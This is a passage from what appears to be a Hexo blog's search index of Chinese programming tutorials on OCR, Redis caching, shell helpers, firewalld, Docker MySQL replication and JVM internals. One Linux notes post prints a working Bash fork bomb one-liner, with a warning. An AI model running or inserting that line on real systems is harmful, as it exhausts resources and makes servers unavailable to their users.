="select * from " +(select *,rownum rid from (select * from students order by postime desc) where rid&lt;=" + pagesize*pagenumber +") as t" +"where t&gt;" +pageSize*(pageNumber-1); 6. ORM与 JDBC的关系 orm 是一种思想，就是把object 转变成数据库中的记录，或者把数据库中的记录转变成objecdt，我们可以用jdbc 来实现这种思想，用的较多的orm 工具是hibernate、Mybatis、toplink]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>数据库总结</tag>
        <tag>表连接</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Java做ORC图片识别]]></title>
    <url>%2F2019%2F09%2F04%2F%E4%BD%BF%E7%94%A8Java%E5%81%9AORC%E5%9B%BE%E7%89%87%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[1. 下载训练库下载地址：https://github.com/tesseract-ocr/tessdata 不用全部下载，中文识别下载那个chi_sim.traineddata即可。 2. 添加依赖12345&lt;dependency&gt; &lt;groupId&gt;net.sourceforge.tess4j&lt;/groupId&gt; &lt;artifactId&gt;tess4j&lt;/artifactId&gt; &lt;version&gt;4.3.1&lt;/version&gt;&lt;/dependency&gt; 3. 编写代码1234567891011121314public static String getTextByImage(String imgPath) throws TesseractException &#123; File imageFile = new File(imgPath); if (!imageFile.exists())&#123; throw new RuntimeException("图片不存在"); &#125; Tesseract tesseract = new Tesseract(); // 设置训练库的位置,https://github.com/tesseract-ocr/tessdata tesseract.setDatapath("D://OCR/tessdata"); // 设置识别语言为中文 tesseract.setLanguage("chi_sim"); String result = tesseract.doOCR(imageFile); return result;&#125; 4. 测试123public static void main(String[] args) throws TesseractException &#123; System.out.println(getTextByImage("D://OCR/img/test.png"));&#125;]]></content>
      <categories>
        <category>java工具类</category>
      </categories>
      <tags>
        <tag>ocr</tag>
        <tag>Java</tag>
        <tag>tesseract</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux随笔记]]></title>
    <url>%2F2019%2F09%2F04%2FLinux%E9%9A%8F%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[@[toc] 后台执行任务 开启任务 1nohup 命令 &gt; temp.log &amp; 查看正在运行的任务 1jobs -l 查找文件从 根目录/ 开始查询 1find / -name "my.ini" Fork炸弹 请不要轻易执行，会耗尽服务器资源，使服务器不能正常的对外提供服务 1:()&#123;:|:&amp;&#125;;: 根据名称停止所有相关进程 杀死进程中所有进程名中有 kube关键字的进程 1pkill -9 kube 漂亮的进程监控 安装htop 1yum install -y htop 查看进程 1htop 效果]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>随笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot使用redis做缓存机制]]></title>
    <url>%2F2019%2F09%2F04%2FSpringBoot%E4%BD%BF%E7%94%A8redis%E5%81%9A%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[SpringBoot 2.0.3 版本、redis3.2版本 1. 加入jar包12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;&lt;/dependency&gt; 2. 编写RedisConfig类12345678910111213141516171819202122232425262728293031323334353637383940package com.pibigstar.common.config;import org.springframework.cache.CacheManager;import org.springframework.cache.annotation.CachingConfigurerSupport;import org.springframework.cache.annotation.EnableCaching;import org.springframework.cache.interceptor.KeyGenerator;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.cache.RedisCacheManager;import org.springframework.data.redis.connection.RedisConnectionFactory;@Configuration@EnableCachingpublic class RedisConfig extends CachingConfigurerSupport&#123; //缓存管理器 @Bean public CacheManager cacheManager(RedisConnectionFactory factory) &#123; RedisCacheManager cacheManager = RedisCacheManager.builder(factory).build(); return cacheManager; &#125; //自定义缓存key生成策略 @Bean public KeyGenerator keyGenerator() &#123; return new KeyGenerator()&#123; @Override public Object generate(Object target, java.lang.reflect.Method method, Object... params) &#123; StringBuffer sb = new StringBuffer(); sb.append(target.getClass().getName()); sb.append(method.getName()); for(Object obj:params)&#123; sb.append(obj.toString()); &#125; System.out.println("调用Redis生成key："+sb.toString()); return sb.toString(); &#125; &#125;; &#125;&#125; 2.1 配置application.yml文件12345678910111213spring: redis: host: 127.0.0.1 port: 6379 database: 0 # 设置数据库索引为0 默认为0 password: # 密码为空 jedis: pool: max-active: 1000 # 连接池最大连接数（使用负值表示没有限制） max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制） max-idle: 10 # 连接池中的最大空闲连接 min-idle: 2 # 连接池中的最小空闲连接 timeout: 2000 # 连接超时时间（毫秒） 3. 在 适当的地方加入缓存12345678910111213141516171819202122232425262728293031323334package com.pibigstar.service.impl;import java.util.List;import javax.transaction.Transactional;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.cache.annotation.CacheConfig;import org.springframework.cache.annotation.Cacheable;import org.springframework.stereotype.Service;import com.pibigstar.dao.GradeMapper;import com.pibigstar.domain.Grade;import com.pibigstar.service.GradeService;@Service@CacheConfig(cacheNames="grades")public class GradeServiceImpl implements GradeService&#123; @Autowired private GradeMapper gradeMapper; @Override @Cacheable //开启缓存 public Grade getOneById(Long id) &#123; return gradeMapper.selectByPrimaryKey(id); &#125; @Override @Cacheable //开启缓存 public List&lt;Grade&gt; list() &#123; return gradeMapper.findAll(); &#125;&#125; @Cacheable将查询结果缓存到redis中，（key=”#p0”）指定传入的第一个参数作为redis的key。 @CachePut，指定key，将更新的结果同步到redis中 @CacheEvict，指定key，删除缓存数据，allEntries=true,方法调用后将立即清除缓存 4. 启动4.1 启动redis下载： https://pan.baidu.com/s/1tTYcCRUF-qDikhPTkSiJTQ 解压，双击 start.bat 即可 RedisDesktopManager 文件夹放的是redis 可视化工具 4.2 启动项目调用 开启缓存的那两个方法，就可以看到控制台输出了： 通过redis 可视化工具可以看到： 已经有key值生成了， 当再一次查询的时候就不会去从数据库中查询了，而是直接从我们的redis中查询，速度会非常快。 需要注意的是：当数据库中值改变了，因为它查询的是从缓存中查询，所以查出来的数据还是之前的数据，只有当key过期之后或者被删除之后才能查到最新的值 5. 常用redis命令 flushdb：清空当前数据库。 select [index]：选择索引数据库，index为索引值名，如：select 1。 keys *：查看数据库内所有的key。 del [key]：删除一条指定key的值。 get [key] : 获得 指定key的值 flushall：清空所有数据库。 quit：退出客户端连接 关注我的公众号，获取最新Java干货]]></content>
      <categories>
        <category>springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>redis缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js特效]]></title>
    <url>%2F2019%2F08%2F30%2Fjs%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[鼠标点击产生红心特效1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556! function (e, t, a) &#123; function n() &#123; c( ".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;" ), o(), r() &#125; function r() &#123; for (var e = 0; e &lt; d.length; e++) d[e].alpha &lt;= 0 ? (t.body.removeChild(d[e].el), d.splice(e, 1)) : (d[e].y--, d[e].scale += .004, d[e].alpha -= .013, d[e].el.style.cssText = "left:" + d[e].x + "px;top:" + d[e].y + "px;opacity:" + d[e].alpha + ";transform:scale(" + d[e].scale + "," + d[e].scale + ") rotate(45deg);background:" + d[e].color + ";z-index:99999"); requestAnimationFrame(r) &#125; function o() &#123; var t = "function" == typeof e.onclick &amp;&amp; e.onclick; e.onclick = function (e) &#123; t &amp;&amp; t(), i(e) &#125; &#125; function i(e) &#123; var a = t.createElement("div"); a.className = "heart", d.push(&#123; el: a, x: e.clientX - 5, y: e.clientY - 5, scale: 1, alpha: 1, color: s() &#125;), t.body.appendChild(a) &#125; function c(e) &#123; var a = t.createElement("style"); a.type = "text/css"; try &#123; a.appendChild(t.createTextNode(e)) &#125; catch (t) &#123; a.styleSheet.cssText = e &#125; t.getElementsByTagName("head")[0].appendChild(a) &#125; function s() &#123; return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")" &#125; var d = []; e.requestAnimationFrame = function () &#123; return e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) &#123; setTimeout(e, 1e3 / 60) &#125; &#125;(), n()&#125;(window, document);]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用Shell方法集合]]></title>
    <url>%2F2019%2F08%2F29%2F%E5%B8%B8%E7%94%A8Shell%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[判断是否是root用户12345678910check_root() &#123; local user="" user="$(id -un 2&gt;/dev/null || true)" if [ "$user" != "root" ]; then cat &gt;&amp;2 &lt;&lt;-'EOF' 权限错误, 请使用 root 用户运行此脚本! EOF exit 1 fi&#125; 判断命令是否存在12345678910command_exists() &#123; command -v "$@" &gt;/dev/null 2&gt;&amp;1&#125;if command_exists ip;then echo "存在ip命令"elif command_exists ifconfig; then echo "存在ifconfig命令"else echo "都不存在"fi 判断参数是否为数字123456789is_number() &#123; expr "$1" + 1 &gt;/dev/null 2&gt;&amp;1&#125;if ! ( is_number "$1" ); thencat &gt;&amp;2 &lt;&lt;-EOF请输入数字EOFexit 1fi 获取服务器IP地址12345678910111213141516171819202122get_server_ip() &#123; local server_ip="" local interface_info="" if command_exists ip; then interface_info="$(ip addr)" elif command_exists ifconfig; then interface_info="$(ifconfig)" fi server_ip=$(echo "$interface_info" | \ grep -oE "[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;" | \ grep -vE "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | \ head -n 1) # 自动获取失败时，通过网站提供的 API 获取外网地址 if [ -z "$server_ip" ]; then server_ip="$(wget -qO- --no-check-certificate https://ipv4.icanhazip.com)" fi echo "$server_ip"&#125; 下载文件，重试3次12345678910111213141516171819202122232425262728download_file() &#123; # 文件下载链接 local url="$1" # 文件下载后存放路径 local file="$2" local retry=0 download_file_to_path() &#123; if [ $retry -ge 3 ]; then rm -f "$file" cat &gt;&amp;2 &lt;&lt;-EOF 文件下载失败! 请重试。 URL: $&#123;url&#125; EOF fi ( set -x; wget -O "$file" --no-check-certificate "$url" ) if [ "$?" != "0" ] || [ -n "$verify_cmd" ] &amp;&amp; ! verify_file; then retry=$(expr $retry + 1) download_file_to_path fi &#125; download_file_to_path&#125;# 使用DOCKERFILE_DOWNLOAD_URL="https://github.com/pibigstar/go-todo/blob/master/Dockerfile"download_file "$DOCKERFILE_DOWNLOAD_URL" "/usr/local/todo"]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux防火墙操作]]></title>
    <url>%2F2019%2F08%2F29%2FLinux%E9%98%B2%E7%81%AB%E5%A2%99%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[1. 查看防火墙状态1sudo firewall-cmd --state 如果是运行中则会输出 running，如果没有运行则会输出 not running 2. 关闭防火墙1234# 关闭systemctl stop firewalld# 关闭开机自启systemctl disable firewalld 3. 开启防火墙1systemctl start firewalld 4. 添加端口白名单 将 5901-5905端口添加到白名单中 1sudo firewall-cmd --permanent --zone=public --add-port=5901-5905/tcp 5. 重新加载1sudo firewall-cmd --reload 6. 查看白名单端口列表1sudo firewall-cmd --list-all-zones]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>firewall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用docker搭建MySQL主从架构集群]]></title>
    <url>%2F2019%2F08%2F29%2F%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E6%9E%B6%E6%9E%84%E9%9B%86%E7%BE%A4%2F</url>
    <content type="text"><![CDATA[拉取mysql镜像这里拉取的是mysql 5.7版本的镜像 1docker pull mysql:5.7 启动两个MySQL容器启动两个MySQL容器，一个作为master，一个作为slave master节点，将本地的 3307端口映射到容器的3306端口，密码为123456 1docker run -p 3307:3306 --name mysql-master -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 slave节点，将本地的 3308端口映射到容器的3306端口，密码为123456 1docker run -p 3308:3306 --name mysql-slave -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 启动完成之后，可通过docker ps 查看是否启动成功。 登录到mysql中登录到master节点中 1mysql -uroot -h127.0.0.1 -P3307 -p123456 再启动一个命令窗口，进入到 slave节点 1mysql -uroot -h127.0.0.1 -P3308 -p123456 配置master通过docker exec进入容器内部 1docker exec -it mysql-master /bin/bash 修改my.cnf文件 1echo -e "[mysqld]\nserver-id=100\nlog-bin=mysql-bin" &gt;&gt; etc/mysql/my.cnf 其实也就是新增下面两句配置 12345[mysqld]## 同一局域网内注意要唯一server-id=100 ## 开启二进制日志功能，可以随便取（关键）log-bin=mysql-bin 重启mysql服务 1service mysql restart 重启时容器会退出，我们需要重新启动一次容器 1docker start mysql-master 配置slave和master一样，修改my.cnf文件 1echo -e "[mysqld]\nserver-id=101\nlog-bin=mysql-slave-bin\nrelay_log=edu-mysql-relay-bin" &gt;&gt; etc/mysql/my.cnf 其实也就在文件中加入下面的配置 1234567[mysqld]## 设置server_id,注意要唯一server-id=101 ## 开启二进制日志功能，以备Slave作为其它Slave的Master时使用log-bin=mysql-slave-bin ## relay_log配置中继日志relay_log=edu-mysql-relay-bin 然后重启mysql服务 1service mysql restart 重启过程中，容器会自动退出，我们需要重新启动一次容器 1docker start mysql-master 下一步在Master数据库创建数据同步用户，授予用户slave REPLICATION SLAVE权限和REPLICATION CLIENT权限，用于在主从库之间同步数据。 12CREATE USER &apos;slave&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos;;GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &apos;slave&apos;@&apos;%&apos;; 将slave链接到master先去master中查看下binlog的状态 1mysql -uroot -h127.0.0.1 -P3307 -p123456 查看状态 1show master status; File和Position字段的值后面将会用到，在后面的操作完成之前，需要保证Master库不能做任何操作，否则将会引起状态变化，File和Position字段的值也会变化。 进入到slave中 1mysql -uroot -h127.0.0.1 -P3308 -p123456 链接到master 1234567change master to master_host='172.17.0.2', master_user='slave', master_password='123456', master_port=3306, master_log_file='mysql-bin.000001', master_log_pos= 0, master_connect_retry=30; 注： master_host Master的地址，指的是容器的独立ip,可以通过下面命令查看 1docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; mysql-master master_port 容器的端口号，指的是容器内部运行mysql的端口号 master_user 是我们在master中配置的用户主从复制的用户名 master_log_file 是上一步中从master中查出File字段的值 master_log_pos 是复制起始点，如果为0，为从头复制 开启主从复制在 slave 中查看主从复制状态，可以看到目前主从复制是还没有开启的。 1show slave status \G; 开启主从复制 1start slave; 再次查看，我们看到主从复制已经开启了。 测试主从复制我们在master中创建一个数据库，看是否在slave中也会创建 进入到master中的mysql执行创建数据库命令 1create database test default character set utf8; 然后进入到slave节点中查看是否有该数据库 1show databases; 我们看到从库中已经创建了test数据库，至此我们的主从MySQL集群架构已经搭建完毕了。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用GitHub创建个人官网]]></title>
    <url>%2F2019%2F08%2F23%2F%E4%BD%BF%E7%94%A8GitHub%E5%88%9B%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%AE%98%E7%BD%91%2F</url>
    <content type="text"><![CDATA[1.新建项目 项目名称为：你的github用户名.github.io项目名字必须叫这个，比如我的GitHub用户名叫pibigstar那么新建项目为：pibigstar.github.io 2. 将网页上传到这个项目即可123456git add .git commit -m "first commit"git push origin master 3. 访问访问地址为： https://pibigstar.github.io]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JVM学习总结]]></title>
    <url>%2F2019%2F08%2F21%2FJVM%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[转载自：https://github.com/crossoverJie/Java-Interview 1. Java 运行时的内存划分 1.1 程序计数器记录当前线程所执行的字节码行号，用于获取下一条执行的字节码。 当多线程运行时，每个线程切换后需要知道上一次所运行的状态、位置。由此也可以看出程序计数器是每个线程私有的。 1.2 虚拟机栈虚拟机栈是有一个一个的栈帧组成，栈帧是在每一个方法调用时产生的。 每一个栈帧由局部变量区、操作数栈等组成。每创建一个栈帧压栈，当一个方法执行完毕之后则出栈。 如果出现方法递归调用出现死循环的话就会造成栈帧过多，最终会抛出 stackoverflow 异常。这块内存区域也是线程私有的。 1.3 Java 堆Java 堆是整个虚拟机所管理的最大内存区域，所有的对象创建都是在这个区域进行内存分配。 这块区域也是垃圾回收器重点管理的区域，由于大多数垃圾回收器都采用分代回收算法，所有堆内存也分为 新生代、老年代，可以方便垃圾的准确回收。 这块内存属于线程共享区域。 1.4 方法区方法区主要用于存放已经被虚拟机加载的类信息，如常量，静态变量。 这块区域也被称为永久代。 1.5 运行时常量池运行时常量池是方法区的一部分，其中存放了一些符号引用。当 new 一个对象时，会检查这个区域是否有这个符号的引用。 2. 类的加载机制2.1 双亲委派模型模型如下图： 双亲委派模型中除了启动类加载器之外其余都需要有自己的父类加载器 当一个类收到了类加载请求时: 自己不会首先加载，而是委派给父加载器进行加载，每个层次的加载器都是这样。 所以最终每个加载请求都会经过启动类加载器。只有当父类加载返回不能加载时子加载器才会进行加载。 双亲委派的好处 : 由于每个类加载都会经过最顶层的启动类加载器，比如 java.lang.Object这样的类在各个类加载器下都是同一个类(只有当两个类是由同一个类加载器加载的才有意义，这两个类才相等。) 如果没有双亲委派模型，由各个类加载器自行加载的话。当用户自己编写了一个 java.lang.Object类，那样系统中就会出现多个 Object，这样 Java 程序中最基本的行为都无法保证，程序会变的非常混乱。 3. 垃圾回收 垃圾回收主要思考三件事情: 哪种内存需要回收？ 什么时候回收？ 怎么回收？ 3.1 对象是否存活引用计数法 这是一种非常简单易理解的回收算法。每当有一个地方引用一个对象的时候则在引用计数器上 +1，当失效的时候就 -1，无论什么时候计数器为 0 的时候则认为该对象死亡可以回收了。 这种算法虽然简单高效，但是却无法解决循环引用的问题，因此 Java 虚拟机并没有采用这种算法。 可达性分析算法 主流的语言其实都是采用可达性分析算法: 可达性算法是通过一个称为 GC Roots 的对象向下搜索，整个搜索路径就称为引用链，当一个对象到 GC Roots 没有任何引用链 JVM 就认为该对象是可以被回收的。 如图:Object1、2、3、4 都是存活的对象，而 Object5、6、7都是可回收对象。 可以用作 GC-Roots 的对象有: 方法区中静态变量所引用的对象。 虚拟机栈中所引用的对象。 3.2 垃圾回收算法标记-清除算法 标记清除算法分为两个步骤，标记和清除。 首先将需要回收的对象标记起来，然后统一清除。但是存在两个主要的问题: 标记和清除的效率都不高。清除之后容易出现不连续内存，当需要分配一个较大内存时就不得不需要进行一次垃圾回收。标记清除过程如下: 复制算法 复制算法是将内存划分为两块大小相等的区域，每次使用时都只用其中一块区域，当发生垃圾回收时会将存活的对象全部复制到未使用的区域，然后对之前的区域进行全部回收。 这样简单高效，而且还不存在标记清除算法中的内存碎片问题，但就是有点浪费内存。 在新生代会使用该算法。新生代中分为一个 Eden 区和两个 Survivor 区。通常两个区域的比例是 8:1:1 ，使用时会用到 Eden 区和其中一个 Survivor 区。当发生回收时则会将还存活的对象从 Eden ，Survivor 区拷贝到另一个 Survivor 区，当该区域内存也不足时则会使用分配担保利用老年代来存放内存。 复制算法过程： 标记整理算法 复制算法如果在存活对象较多时效率明显会降低，特别是在老年代中并没有多余的内存区域可以提供内存担保。 所以老年代中使用的时候分配整理算法，它的原理和分配清除算法类似，只是最后一步的清除改为了将存活对象全部移动到一端，然后再将边界之外的内存全部回收。 分代回收算法 现代多数的商用 JVM 的垃圾收集器都是采用的分代回收算法，和之前所提到的算法并没有新的内容。 只是将 Java 堆分为了新生代和老年代。由于新生代中存活对象较少，所以采用复制算法，简单高效。 而老年代中对象较多，并且没有可以担保的内存区域，所以一般采用标记清除或者是标记整理算法。 4. OOM 分析4.1 Java 堆内存溢出在 Java 堆中只要不断的创建对象，并且 GC-Roots 到对象之间存在引用链，这样 JVM 就不会回收对象。 只要将-Xms(最小堆),-Xmx(最大堆) 设置为一样禁止自动扩展堆内存。 当使用一个 while(true) 循环来不断创建对象就会发生 OutOfMemory，还可以使用 -XX:+HeapDumpOutofMemoryErorr 当发生 OOM 时会自动 dump 堆栈到文件中。 伪代码: 123456public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(10) ; while (true)&#123; list.add("1") ; &#125;&#125; 当出现 OOM 时可以通过工具来分析 GC-Roots 引用链 ，查看对象和 GC-Roots 是如何进行关联的，是否存在对象的生命周期过长，或者是这些对象确实改存在的，那就要考虑将堆内存调大了。 123456789101112131415Exception in thread "main" java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:3210) at java.util.Arrays.copyOf(Arrays.java:3181) at java.util.ArrayList.grow(ArrayList.java:261) at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:235) at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:227) at java.util.ArrayList.add(ArrayList.java:458) at com.crossoverjie.oom.HeapOOM.main(HeapOOM.java:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:147)Process finished with exit code 1 java.lang.OutOfMemoryError: Java heap space表示堆内存溢出。 4.2 MetaSpace (元数据) 内存溢出 JDK8 中将永久代移除，使用 MetaSpace 来保存类加载之后的类信息，字符串常量池也被移动到 Java 堆。 PermSize 和 MaxPermSize 已经不能使用了，在 JDK8 中配置这两个参数将会发出警告。 JDK 8 中将类信息移到到了本地堆内存(Native Heap)中，将原有的永久代移动到了本地堆中成为 MetaSpace ,如果不指定该区域的大小，JVM 将会动态的调整。 可以使用-XX:MaxMetaspaceSize=10M 来限制最大元数据。这样当不停的创建类时将会占满该区域并出现 OOM。 123456789101112131415public static void main(String[] args) &#123; while (true)&#123; Enhancer enhancer = new Enhancer() ; enhancer.setSuperclass(HeapOOM.class); enhancer.setUseCache(false) ; enhancer.setCallback(new MethodInterceptor() &#123; @Override public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123; return methodProxy.invoke(o,objects) ; &#125; &#125;); enhancer.create() ; &#125;&#125; 使用 cglib 不停的创建新类，最终会抛出: 1234567891011Caused by: java.lang.reflect.InvocationTargetException at sun.reflect.GeneratedMethodAccessor1.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at net.sf.cglib.core.ReflectUtils.defineClass(ReflectUtils.java:459) at net.sf.cglib.core.AbstractClassGenerator.generate(AbstractClassGenerator.java:336) ... 11 moreCaused by: java.lang.OutOfMemoryError: Metaspace at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:763) ... 16 more 注意：这里的 OOM 伴随的是 java.lang.OutOfMemoryError: Metaspace 也就是元数据溢出。 5. 对象的创建与内存分配5.1 创建对象当 JVM 收到一个 new 指令时，会检查指令中的参数在常量池是否有这个符号的引用，还会检查该类是否已经被加载过了，如果没有的话则要进行一次类加载。 接着就是分配内存了，通常有两种方式： 指针碰撞 空闲列表 使用指针碰撞的前提是堆内存是完全工整的，用过的内存和没用的内存各在一边每次分配的时候只需要将指针向空闲内存一方移动一段和内存大小相等区域即可。 当堆中已经使用的内存和未使用的内存互相交错时，指针碰撞的方式就行不通了，这时就需要采用空闲列表的方式。虚拟机会维护一个空闲的列表，用于记录哪些内存是可以进行分配的，分配时直接从可用内存中直接分配即可。 堆中的内存是否工整是有垃圾收集器来决定的，如果带有压缩功能的垃圾收集器就是采用指针碰撞的方式来进行内存分配的。 分配内存时也会出现并发问题: 这样可以在创建对象的时候使用 CAS 这样的乐观锁来保证。 也可以将内存分配安排在每个线程独有的空间进行，每个线程首先在堆内存中分配一小块内存，称为本地分配缓存(TLAB : Thread Local Allocation Buffer)。 分配内存时，只需要在自己的分配缓存中分配即可，由于这个内存区域是线程私有的，所以不会出现并发问题。 可以使用 -XX:+/-UseTLAB 参数来设定 JVM 是否开启 TLAB 。 内存分配之后需要对该对象进行设置，如对象头。对象头的一些应用可以查看 Synchronize 关键字原理。 对象访问一个对象被创建之后自然是为了使用，在 Java 中是通过栈来引用堆内存中的对象来进行操作的。 对于我们常用的 HotSpot 虚拟机来说，这样引用关系是通过直接指针来关联的。 如图: 这样的好处就是：在 Java 里进行频繁的对象访问可以提升访问速度(相对于使用句柄池来说)。 5.2 内存分配####Eden 区分配 简单的来说对象都是在堆内存中分配的，往细一点看则是优先在 Eden 区分配。 这里就涉及到堆内存的划分了，为了方便垃圾回收，JVM 将堆内存分为新生代和老年代。 而新生代中又会划分为 Eden 区，from Survivor、to Survivor区。 其中 Eden 和 Survivor 区的比例默认是8:1:1，当然也支持参数调整 -XX:SurvivorRatio=8。 当在 Eden 区分配内存不足时，则会发生 minorGC ，由于 Java 对象多数是朝生夕灭的特性，所以 minorGC 通常会比较频繁，效率也比较高。 当发生 minorGC 时，JVM 会根据复制算法将存活的对象拷贝到另一个未使用的 Survivor 区，如果 Survivor 区内存不足时，则会使用分配担保策略将对象移动到老年代中。 谈到 minorGC 时，就不得不提到 fullGC(majorGC) ，这是指发生在老年代的 GC ，不论是效率还是速度都比 minorGC 慢的多，回收时还会发生 stop the world 使程序发生停顿，所以应当尽量避免发生 fullGC 。 老年代分配也有一些情况会导致对象直接在老年代分配，比如当分配一个大对象时(大的数组，很长的字符串)，由于 Eden 区没有足够大的连续空间来分配时，会导致提前触发一次 GC，所以尽量别频繁的创建大对象。 因此 JVM 会根据一个阈值来判断大于该阈值对象直接分配到老年代，这样可以避免在新生代频繁的发生 GC。 对于一些在新生代的老对象 JVM 也会根据某种机制移动到老年代中。 JVM 是根据记录对象年龄的方式来判断该对象是否应该移动到老年代，根据新生代的复制算法，当一个对象被移动到 Survivor 区之后 JVM 就给该对象的年龄记为1，每当熬过一次 minorGC 后对象的年龄就 +1 ，直到达到阈值(默认为15)就移动到老年代中。 可以使用-XX:MaxTenuringThreshold=15 来配置这个阈值。 ###总结 虽说这些内容略显枯燥，但当应用发生不正常的 GC 时，可以方便更快的定位问题。 6. volatile 关键字前言不管是在面试还是实际开发中 volatile都是一个应该掌握的技能。 首先来看看为什么会出现这个关键字。 6.1 内存可见性 由于 Java 内存模型(JMM)规定，所有的变量都存放在主内存中，而每个线程都有着自己的工作内存(高速缓存)。 线程在工作时，需要将主内存中的数据拷贝到工作内存中。这样对数据的任何操作都是基于工作内存(效率提高)，并且不能直接操作主内存以及其他线程工作内存中的数据，之后再将更新之后的数据刷新到主内存中。 这里所提到的主内存可以简单认为是堆内存，而工作内存则可以认为是栈内存。如下图所示： 所以在并发运行时可能会出现线程 B 所读取到的数据是线程 A 更新之前的数据。 显然这肯定是会出问题的，因此 volatile 的作用出现了： 当一个变量被 volatile 修饰时，任何线程对它的写操作都会立即刷新到主内存中，并且会强制让缓存了该变量的线程中的数据清空，必须从主内存重新读取最新数据。 volatile 修饰之后并不是让线程直接从主内存中获取数据，依然需要将变量拷贝到工作内存中。 内存可见性的应用 当我们需要在两个线程间依据主内存通信时，通信的那个变量就必须的用 volatile 来修饰： 1234567891011121314151617181920212223242526272829public class Volatile implements Runnable&#123; private static volatile boolean flag = true ; @Override public void run() &#123; while (flag)&#123; System.out.println(Thread.currentThread().getName() + "正在运行。。。"); &#125; System.out.println(Thread.currentThread().getName() +"执行完毕"); &#125; public static void main(String[] args) throws InterruptedException &#123; Volatile aVolatile = new Volatile(); new Thread(aVolatile,"thread A").start(); System.out.println("main 线程正在运行") ; TimeUnit.MILLISECONDS.sleep(100) ; aVolatile.stopThread(); &#125; private void stopThread()&#123; flag = false ; &#125;&#125; 主线程在修改了标志位使得线程 A 立即停止，如果没有用 volatile 修饰，就有可能出现延迟。 但这里有个误区，这样的使用方式容易给人的感觉是： 对 volatile 修饰的变量进行并发操作是线程安全的。这里要重点强调，volatile 并不能保证线程安全性（不能保证其原子性）！ 如下程序: 1234567891011121314151617181920212223242526272829303132public class VolatileInc implements Runnable&#123; private static volatile int count = 0 ; //使用 volatile 修饰基本数据内存不能保证原子性 //private static AtomicInteger count = new AtomicInteger() 